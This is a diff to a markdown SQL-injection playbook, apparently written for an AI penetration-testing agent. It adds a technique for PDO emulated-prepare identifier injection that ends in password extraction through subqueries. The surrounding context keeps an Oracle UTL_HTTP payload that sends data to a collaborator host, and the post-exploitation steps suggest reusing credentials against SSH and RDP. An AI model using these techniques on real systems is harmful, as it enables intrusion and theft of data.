@@ -228,7 +228,72 @@ When neither boolean nor time-based is reliable, exfiltrate via DNS or HTTP call
 ' AND 1=UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.COLLABORATOR.oastify.com/')--+
 ```
 
-## Step 6: Post-Exploitation
+## Step 6: PDO Emulated Prepares — Identifier-Position Injection
+
+When the injection point is in an **identifier position** (column name, table
+name, ORDER BY target) and the application uses PHP PDO with emulated prepares
+(the default), standard blind SQLi techniques may not apply. PDO's query parser
+does not understand backtick-quoted identifiers, creating exploitable
+mismatches between what PDO considers a placeholder and what MySQL executes.
+
+### Detection
+
+Signs that you're dealing with identifier-position injection:
+- User input controls a column name, sort field, or table name
+- The application wraps the value in backticks: `` `user_input` ``
+- Standard `' OR 1=1--` payloads have no effect (not in a string context)
+- sqlmap returns "parameter does not appear to be injectable"
+- Source code shows PDO `prepare()` with variable interpolation in identifier
+  positions (not in WHERE value positions)
+
+### PDO Parser Mismatch
+
+PDO's emulated prepare mode (default when `ATTR_EMULATE_PREPARES` is not
+explicitly set to `false`) performs client-side placeholder substitution. The
+parser scans the query string for `?` markers, but does **not** understand
+MySQL's backtick quoting context. This means:
+
+- `` SELECT `?` FROM t WHERE id = ? `` — PDO sees TWO placeholders
+- MySQL sees ONE placeholder (the backtick-wrapped `?` is an identifier literal)
+- If the application binds N values but PDO counts N+1 placeholders, the bound
+  values **shift** — a value intended for a WHERE clause may land in the SELECT
+  column list or vice versa
+
+### Exploitation Pattern
+
+When user input controls an identifier that gets backtick-wrapped, and a
+subsequent bound parameter (e.g., `user_id`) contains user-controlled data:
+
+1. **Inject a `?` inside the identifier** — use `\?` or other forms that
+   survive input sanitization but produce a literal `?` after backtick stripping
+2. **Comment out the original placeholder** — `-- ` after the identifier
+   silences the real `?` in the WHERE clause
+3. **The next bound value shifts** into the identifier position — if that
+   value is user-controlled (e.g., via IDOR on a `user_id` parameter), it
+   becomes a SQL injection point in the SELECT column list
+
+### MySQL Identifier Context
+
+Once a value is shifted into the column position of a SELECT query:
+- Subqueries work: `(SELECT password FROM users LIMIT 1)` returns data as
+  the column value
+- `SLEEP()` works for time-based confirmation
+- UPDATE via stacked queries (if PDO uses `PDO::MYSQL_ATTR_MULTI_STATEMENTS`
+  or the driver allows it)
+
+### Key Indicators to Report
+
+If you suspect this class of vulnerability, report to the orchestrator:
+- PDO usage with emulated prepares (default or explicit)
+- Identifier-position user input with backtick wrapping
+- Presence of user-controlled bound parameters that could shift
+- Whether stacked queries are available
+
+This is a niche technique — if standard blind SQLi fails on a PHP/PDO target
+with identifier-position input, escalate to `unknown-vector-analysis` with
+these details for deep analysis.
+
+## Step 7: Post-Exploitation
 
 After extracting credentials or key data:
 1. **Escalate technique** — if found higher-privilege DB creds, try **sql-injection-union** or **sql-injection-stacked**
@@ -236,7 +301,7 @@ After extracting credentials or key data:
 3. **Command execution** — route to **sql-injection-stacked**
 4. **Credential reuse** — test against SSH, RDP, admin panels
 
-## Step 7: Escalate or Pivot
+## Step 8: Escalate or Pivot
 
 STOP and return to the orchestrator with:
 - What was achieved (RCE, creds, file read, etc.)
